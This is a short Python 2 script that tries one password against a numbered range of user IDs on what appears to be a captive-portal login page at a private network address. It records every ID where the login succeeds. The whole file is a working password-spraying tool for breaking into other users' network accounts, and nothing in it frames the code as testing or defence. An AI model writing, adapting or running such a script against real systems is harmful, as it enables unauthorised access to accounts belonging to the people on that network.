import urllib
import time
import datetime
import urllib2
import sys
import xml.dom.minidom as XML


def login_req(username, password):
    url = 'http://172.16.68.6:8090/httpclient.html'
    post_data = 'mode=191' + '&username=' + username + '&password=' + password
    try:
        req = urllib2.Request(url, post_data)
        response = urllib2.urlopen(req)
        xml_dom = XML.parseString(response.read())
        document = xml_dom.documentElement
        response = document.getElementsByTagName('message')[0].childNodes[0].nodeValue
        if 'successfully' in response:
            return True
        elif 'limit' in response:
            return True
        elif 'data' in response:
            return True
            
    except:
        return False  



if __name__ == '__main__' :
    password = raw_input("enter password:")
    fob = open('IDS/'+password,'w')
    userid = 16102000 #Enter the starting userid here
    count = 0
    while(userid != 16103800): #Enter the ending userid here
        if login_req(str(userid), password) == True:
            count += 1
            print str(userid) + " " + str(count) + "\n"
            fob.write(str(userid)+"\n")

        userid += 1
        if userid == 16102800:
            userid = 16103000
